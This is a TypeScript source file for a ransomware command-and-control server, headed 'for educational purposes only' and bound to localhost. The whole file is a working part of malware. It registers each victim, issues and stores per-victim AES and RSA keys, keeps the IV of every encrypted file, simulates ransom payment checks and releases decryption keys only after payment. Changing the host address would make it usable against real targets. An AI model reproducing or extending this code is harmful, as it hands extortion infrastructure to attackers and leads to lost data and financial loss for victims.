// Ransomware Command & Control Server
// For educational purposes only

import net from 'net'
import crypto from 'crypto'
import fs from 'fs'
import path from 'path'
import { generateRSAKeys, encryptRSA, decryptRSA } from './rsaComm'

// Server configuration
const SERVER_PORT = 4444
const SERVER_HOST = '127.0.0.1' // localhost - only for demonstration

// Store victim information and encryption keys
interface VictimInfo {
    victimId: string
    aesKey: Buffer
    encryptedAESKey: Buffer
    publicKey: string
    privateKey: string
    infected: Date
    ipAddress: string
    paymentStatus: 'pending' | 'paid'
    ivMap: Map<string, Buffer> // Maps file paths to their IVs
}

// In-memory storage of victim information
// In a real malicious scenario, this would be stored in a database
const victims = new Map<string, VictimInfo>()

// Create server instance
const server = net.createServer()

// Message types for client-server communication
enum MessageType {
    INITIALIZE = 'INITIALIZE',
    STORE_IV = 'STORE_IV',
    ENCRYPT_KEY = 'ENCRYPT_KEY',
    DECRYPT_REQUEST = 'DECRYPT_REQUEST',
    PAYMENT_VERIFICATION = 'PAYMENT_VERIFICATION'
}

interface ServerMessage {
    type: string
    victimId?: string
    publicKey?: string
    aesKey?: string // Base64 encoded
    encryptedAESKey?: string // Base64 encoded
    privateKey?: string
    success?: boolean
    message?: string
    iv?: string // Base64 encoded
    filePath?: string
}

// Generate a unique ID for the victim
function generateVictimId(): string {
    return crypto.randomBytes(8).toString('hex')
}

// Handle client connection
server.on('connection', (socket) => {
    const clientAddress = `${socket.remoteAddress}:${socket.remotePort}`
    let currentVictimId: string | null = null

    console.log(`[+] Client connected: ${clientAddress}`)

    // Handle data from clients
    socket.on('data', (data) => {
        try {
            // Parse the JSON message from client
            const message = JSON.parse(data.toString()) as ServerMessage
            console.log(`[+] Received ${message.type} from ${clientAddress}`)

            let response: ServerMessage

            // Handle different message types
            switch (message.type) {
                case MessageType.INITIALIZE:
                    if (message.victimId) {
                        // Client is trying to reconnect with an existing ID
                        response = handleReconnect(
                            message.victimId,
                            clientAddress
                        )
                    } else {
                        // New client, generate new victim ID
                        response = handleInitialize(clientAddress)
                    }
                    currentVictimId = response.victimId || null
                    break

                case MessageType.STORE_IV:
                    if (!currentVictimId || !message.filePath || !message.iv) {
                        response = {
                            type: 'ERROR',
                            message: 'Missing victim ID, filePath or IV'
                        }
                    } else {
                        response = handleStoreIV(
                            currentVictimId,
                            message.filePath,
                            Buffer.from(message.iv, 'base64')
                        )
                    }
                    break

                case MessageType.ENCRYPT_KEY:
                    if (!currentVictimId) {
                        response = {
                            type: 'ERROR',
                            message: 'Missing victim ID'
                        }
                    } else {
                        response = handleEncryptKey(currentVictimId)
                    }
                    break

                case MessageType.PAYMENT_VERIFICATION:
                    if (!message.victimId || !message.message) {
                        // message contains transaction ID
                        response = {
                            type: 'ERROR',
                            message:
                                'Missing victim ID or transaction information'
                        }
                    } else {
                        response = handlePaymentVerification(
                            message.victimId,
                            message.message // transaction ID
                        )
                    }
                    break

                case MessageType.DECRYPT_REQUEST:
                    if (!message.victimId) {
                        response = {
                            type: 'ERROR',
                            message: 'Missing victim ID'
                        }
                    } else {
                        response = handleDecryptRequest(message.victimId)
                    }
                    break

                default:
                    response = {
                        type: 'ERROR',
                        message: 'Unknown message type'
                    }
            }

            // Send response back to client
            socket.write(JSON.stringify(response))
            console.log(
                `[+] Sent ${response.type} response to ${clientAddress}`
            )
        } catch (error) {
            console.error(
                `[-] Error processing message from ${clientAddress}:`,
                error
            )
            socket.write(
                JSON.stringify({
                    type: 'ERROR',
                    message: 'Failed to process request'
                })
            )
        }
    })

    // Handle client disconnection
    socket.on('end', () => {
        console.log(`[+] Client disconnected: ${clientAddress}`)
    })

    // Handle errors
    socket.on('error', (err) => {
        console.error(`[-] Socket error from ${clientAddress}:`, err)
    })
})

// Handle reconnection from existing client
function handleReconnect(victimId: string, ipAddress: string): ServerMessage {
    const victim = victims.get(victimId)

    // Check if victim exists
    if (!victim) {
        console.log(
            `[-] Failed reconnection attempt with unknown victim ID: ${victimId}`
        )
        // Create a new victim instead
        return handleInitialize(ipAddress)
    }

    // Update IP address (might have changed)
    victim.ipAddress = ipAddress
    console.log(`[+] Victim reconnected: ${victimId} from ${ipAddress}`)

    // Return the existing victim information
    return {
        type: 'INITIALIZE_RESPONSE',
        victimId: victim.victimId,
        publicKey: victim.publicKey,
        aesKey: victim.aesKey.toString('base64')
    }
}

// Handle initialization request - generate a new victim ID and keys
function handleInitialize(ipAddress: string): ServerMessage {
    // Generate victim ID
    const victimId = generateVictimId()

    // Generate AES key for file encryption
    const aesKey = crypto.randomBytes(32)

    // Generate RSA key pair for secure communication
    const { publicKey, privateKey } = generateRSAKeys()

    // Store victim information
    victims.set(victimId, {
        victimId,
        aesKey,
        encryptedAESKey: Buffer.alloc(0), // Will be set later
        publicKey,
        privateKey,
        infected: new Date(),
        ipAddress,
        paymentStatus: 'pending',
        ivMap: new Map<string, Buffer>()
    })

    console.log(`[+] Initialized new victim: ${victimId}`)
    logVictimStatus()

    // Save victim data immediately
    saveVictimData(victimId)

    // Return the victim ID and public key to the client
    return {
        type: 'INITIALIZE_RESPONSE',
        victimId,
        publicKey,
        aesKey: aesKey.toString('base64')
    }
}

// Handle storing IVs for encrypted files
function handleStoreIV(
    victimId: string,
    filePath: string,
    iv: Buffer
): ServerMessage {
    const victim = victims.get(victimId)

    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim ID not found'
        }
    }

    // Store the IV for this file
    victim.ivMap.set(filePath, iv)

    console.log(`[+] Stored IV for file: ${filePath} (Victim: ${victimId})`)

    return {
        type: 'STORE_IV_RESPONSE',
        success: true
    }
}

// Handle encrypting the AES key with the attacker's public key
function handleEncryptKey(victimId: string): ServerMessage {
    const victim = victims.get(victimId)

    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim ID not found'
        }
    }    // Encrypt the AES key with the victim's public key
    // Convert AES key from Buffer to string for RSA encryption
    const aesKeyString = victim.aesKey.toString('hex')
    const encryptedAESKey = encryptRSA(aesKeyString, victim.publicKey)
    victim.encryptedAESKey = encryptedAESKey

    console.log(`[+] Encrypted AES key for victim: ${victimId}`)

    return {
        type: 'ENCRYPT_KEY_RESPONSE',
        encryptedAESKey: encryptedAESKey.toString('base64'),
        success: true
    }
}

// Handle payment verification
function handlePaymentVerification(
    victimId: string,
    transactionId: string
): ServerMessage {
    const victim = victims.get(victimId)

    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim ID not found'
        }
    }

    // Simulate payment verification (in a real scenario, this would check blockchain)
    // For this simulation, we assume any transaction ID is valid
    const isPaymentValid = transactionId.length > 8
    if (isPaymentValid) {
        victim.paymentStatus = 'paid'
        console.log(
            `[+] Payment verified for victim: ${victimId} (Transaction: ${transactionId})`
        )

        // Save updated victim data with payment status
        saveVictimData(victimId)
    } else {
        console.log(
            `[-] Invalid payment for victim: ${victimId} (Transaction: ${transactionId})`
        )
    }

    return {
        type: 'PAYMENT_VERIFICATION_RESPONSE',
        success: isPaymentValid
    }
}

// Handle decryption request after payment
function handleDecryptRequest(victimId: string): ServerMessage {
    const victim = victims.get(victimId)

    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim ID not found'
        }
    }

    // Check if payment has been made
    if (victim.paymentStatus !== 'paid') {
        return {
            type: 'DECRYPT_REQUEST_RESPONSE',
            success: false,
            message: 'Payment has not been verified'
        }
    }

    // Prepare IVs to send back to the client
    const ivMapObject: Record<string, string> = {}
    victim.ivMap.forEach((iv, filePath) => {
        ivMapObject[filePath] = iv.toString('base64')
    })
    console.log(`[+] Sending decryption keys for victim: ${victimId}`)

    // Save updated victim data with decryption status
    saveVictimData(victimId)

    // Send the private key and IVs back to the client
    return {
        type: 'DECRYPT_REQUEST_RESPONSE',
        success: true,
        privateKey: victim.privateKey,
        message: JSON.stringify(ivMapObject) // Send IVs as a JSON string
    }
}

// Log current victim status
function logVictimStatus(): void {
    console.log('\n=== Current Victims ===')
    console.log(`Total victims: ${victims.size}`)

    victims.forEach((victim, victimId) => {
        console.log(`\nVictim ID: ${victimId}`)
        console.log(`IP Address: ${victim.ipAddress}`)
        console.log(`Infected: ${victim.infected.toISOString()}`)
        console.log(`Payment Status: ${victim.paymentStatus}`)
        console.log(`Encrypted Files: ${victim.ivMap.size}`)

        // Save victim data to file
        saveVictimData(victimId)
    })
    console.log('\n')
}

// Save victim data to a file with victim ID in the filename
function saveVictimData(victimId: string): void {
    const victim = victims.get(victimId)
    if (!victim) return

    try {
        // Convert the victim data to a serializable object
        const serializableVictim = {
            victimId: victim.victimId,
            infected: victim.infected.toISOString(),
            ipAddress: victim.ipAddress,
            paymentStatus: victim.paymentStatus,
            encryptedFilesCount: victim.ivMap.size,
            // Convert Map to object for JSON serialization
            ivMap: Array.from(victim.ivMap.entries()).reduce(
                (obj, [key, value]) => {
                    obj[key] = value.toString('base64')
                    return obj
                },
                {} as Record<string, string>
            ),
            // Convert Buffer to base64 for JSON serialization
            aesKey: victim.aesKey.toString('base64'),
            encryptedAESKey: victim.encryptedAESKey.toString('base64'),
            publicKey: victim.publicKey,
            privateKey: victim.privateKey
        }

        // Create filename with victim ID and timestamp
        const timestamp = new Date()
            .toISOString()
            .replace(/:/g, '-')
            .replace(/\./g, '-')
        const filename = `victim_${victimId}_${timestamp}.json`
        const filePath = path.join(RESULTS_DIR, filename)

        // Write to file
        fs.writeFileSync(filePath, JSON.stringify(serializableVictim, null, 2))
        console.log(`[+] Saved victim data to: ${filePath}`)
    } catch (error) {
        console.error(`[-] Failed to save victim data: ${error}`)
    }
}

// Ensure results directory exists
const RESULTS_DIR = path.join(__dirname, '../results')
if (!fs.existsSync(RESULTS_DIR)) {
    try {
        fs.mkdirSync(RESULTS_DIR, { recursive: true })
        console.log(`[+] Created results directory: ${RESULTS_DIR}`)
    } catch (error) {
        console.error(`[-] Failed to create results directory: ${error}`)
    }
}

// Start the server
server.listen(SERVER_PORT, SERVER_HOST, () => {
    console.log(`[+] C2 Server running on ${SERVER_HOST}:${SERVER_PORT}`)
    console.log('[+] Waiting for victim connections...')
})

// Handle errors
server.on('error', (err) => {
    console.error('[-] Server error:', err)
})

// Handle server shutdown
process.on('SIGINT', () => {
    console.log('\n[+] Shutting down server...')
    server.close(() => {
        console.log('[+] Server shut down successfully')
        process.exit(0)
    })
})
